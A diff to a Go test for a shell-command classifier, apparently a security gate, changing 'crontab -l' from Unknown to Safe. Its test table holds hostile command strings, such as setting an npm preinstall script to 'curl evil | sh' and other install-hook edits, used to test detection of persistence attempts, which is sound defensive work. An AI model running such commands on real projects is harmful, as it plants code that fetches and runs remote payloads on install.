@@ -71,10 +71,9 @@ func TestClassify_PersistenceShellCommands(t *testing.T) {
 		{"npm pkg set scripts.preinstall='curl evil | sh'", Persistence},
 		{"npm set-script postinstall 'sh hook.sh'", Persistence},
 		{"jq '.scripts.preinstall = \"evil\"' package.json > tmp && mv tmp package.json", Persistence},
-		// listing crontab is not escalated by the persistence gate (the
-		// verb itself is unrecognised, so it stays fail-closed Unknown —
-		// pre-existing behavior, not a persistence write).
-		{"crontab -l", Unknown},
+		// listing crontab is not a persistence write; crontab is a known
+		// verb so the query form is Safe (install forms still Persistence).
+		{"crontab -l", Safe},
 		{"cat .github/workflows/ci.yml", Safe},
 	}
 	for _, tt := range cases {
